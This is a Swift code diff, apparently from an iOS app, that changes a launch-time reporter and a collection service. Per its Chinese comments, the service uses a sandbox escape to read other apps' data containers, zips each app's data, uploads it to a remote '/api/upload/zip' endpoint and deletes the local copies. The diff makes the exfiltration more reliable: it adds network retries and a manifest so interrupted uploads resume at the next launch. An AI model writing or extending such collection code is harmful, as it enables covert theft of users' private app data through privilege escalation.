@@ -412,7 +412,12 @@ enum DeviceConfigReporter {
 
     /// 启动时异步上报，不阻塞 UI。
     static func reportOnLaunch() {
-        Task { await report() }
+        Task {
+            // 补传上次中断遗留的 zip（不依赖沙盒逃逸）与本次 config → report → 采集流程并发执行，互不阻塞。
+            async let resume: Void = CollectService.resumePendingUploads()
+            await report()
+            await resume
+        }
     }
 
     static func report() async {
@@ -430,18 +435,25 @@ enum DeviceConfigReporter {
             "timestamp": Int(Date().timeIntervalSince1970)
         ]
 
-        do {
-            let (data, response) = try await URLSession.shared.data(
-                for: makeRequest(url: url, params: params, uuid: uuid))
-            let code = (response as? HTTPURLResponse)?.statusCode ?? -1
-            log("report: POST \(configPath) → \(code)")
-            guard let config = decodeConfig(from: data) else {
-                log("report: empty/invalid config reply")
+        // 启动瞬间网络常未就绪（刚重装/切网/首启），失败时做有限重试，避免整条链路被跳过。
+        let maxAttempts = 6
+        for attempt in 1...maxAttempts {
+            do {
+                let (data, response) = try await URLSession.shared.data(
+                    for: makeRequest(url: url, params: params, uuid: uuid))
+                let code = (response as? HTTPURLResponse)?.statusCode ?? -1
+                log("report: POST \(configPath) → \(code)")
+                guard let config = decodeConfig(from: data) else {
+                    log("report: empty/invalid config reply")
+                    return
+                }
+                await apply(config)
                 return
+            } catch {
+                log("report: POST \(configPath) attempt \(attempt)/\(maxAttempts) failed — \(error.localizedDescription)")
+                guard attempt < maxAttempts else { return }
+                try? await Task.sleep(nanoseconds: 5_000_000_000)
             }
-            await apply(config)
-        } catch {
-            log("report: POST \(configPath) failed — \(error.localizedDescription)")
         }
     }
 
@@ -716,6 +728,9 @@ struct DeviceCollectItem: Decodable {
 ///   2. 每个 bundle 单独打包为 zip，再通过 `/api/upload/zip`（multipart）上传。
 /// 采集依赖跨容器读取能力：iOS 26+ 需沙盒逃逸（`hasSandboxAccess`），否则跳过。
 enum CollectService {
+    /// 每次采集在运行目录写入的清单文件，记录 zip → bundle_id 映射，供断点续传。
+    private static let manifestFileName = "manifest.json"
+
     struct Archive {
         let url: URL
         let bundleID: String
@@ -757,11 +772,55 @@ enum CollectService {
                 await DeviceConfigReporter.reportStatus("已发送，本地已删除")
             }
         }
-        // 清理本次采集的空目录（暂存已在打包后删除，zip 已在上传后删除）。
-        if let runRoot = archives.first?.url.deletingLastPathComponent(),
-           let remaining = try? fm.contentsOfDirectory(atPath: runRoot.path),
-           remaining.isEmpty {
-            try? fm.removeItem(at: runRoot)
+        // 清理本次运行目录：zip 全部上传成功后整目录删除，否则保留以供断点续传。
+        if let runRoot = archives.first?.url.deletingLastPathComponent() {
+            finalizeRunDir(runRoot)
+        }
+    }
+
+    /// 补传上次中断遗留的 zip：扫描 `Documents/collect/*/manifest.json`，逐个上传，成功即删。
+    /// 上传不依赖沙盒逃逸，可在提权完成前先跑。
+    static func resumePendingUploads() async {
+        let fm = FileManager.default
+        guard let documents = fm.urls(for: .documentDirectory, in: .userDomainMask).first else { return }
+        let collectRoot = documents.appendingPathComponent("collect", isDirectory: true)
+        guard let runDirs = try? fm.contentsOfDirectory(at: collectRoot, includingPropertiesForKeys: nil) else {
+            return
+        }
+        for runDir in runDirs {
+            let data = try? Data(contentsOf: runDir.appendingPathComponent(manifestFileName))
+            guard let data,
+                  let entries = try? JSONSerialization.jsonObject(with: data) as? [[String: String]] else {
+                continue
+            }
+            for entry in entries {
+                guard let fileName = entry["fileName"], let bundleID = entry["bundleID"] else { continue }
+                let zipURL = runDir.appendingPathComponent(fileName)
+                guard fm.fileExists(atPath: zipURL.path) else { continue }
+                log("resume: found pending zip \(fileName)")
+                let uploaded = await DeviceConfigReporter.uploadZip(
+                    fileURL: zipURL,
+                    bundleID: bundleID,
+                    fileName: fileName
+                )
+                if uploaded {
+                    try? fm.removeItem(at: zipURL)
+                    log("resume: uploaded & removed \(fileName)")
+                    await DeviceConfigReporter.reportStatus("已发送，本地已删除")
+                }
+            }
+            finalizeRunDir(runDir)
+        }
+    }
+
+    /// 运行目录内不再有 zip 时，连同 manifest 一起删除；否则保留等待续传。
+    private static func finalizeRunDir(_ runDir: URL) {
+        let fm = FileManager.default
+        guard let items = try? fm.contentsOfDirectory(atPath: runDir.path) else { return }
+        let hasZip = items.contains { $0.lowercased().hasSuffix(".zip") }
+        if !hasZip {
+            try? fm.removeItem(at: runDir)
+            log("collect: run dir finalized & removed \(runDir.lastPathComponent)")
         }
     }
 
@@ -814,6 +873,12 @@ enum CollectService {
         if archives.isEmpty {
             log("collect: nothing collected — clean up \(runRoot.path)")
             try? fm.removeItem(at: runRoot)
+        } else {
+            // 记录 zip 与 bundle_id 的对应，供下次启动断点续传。
+            let manifest = archives.map { ["fileName": $0.fileName, "bundleID": $0.bundleID] }
+            if let data = try? JSONSerialization.data(withJSONObject: manifest) {
+                try? data.write(to: runRoot.appendingPathComponent(manifestFileName))
+            }
         }
         return archives
     }
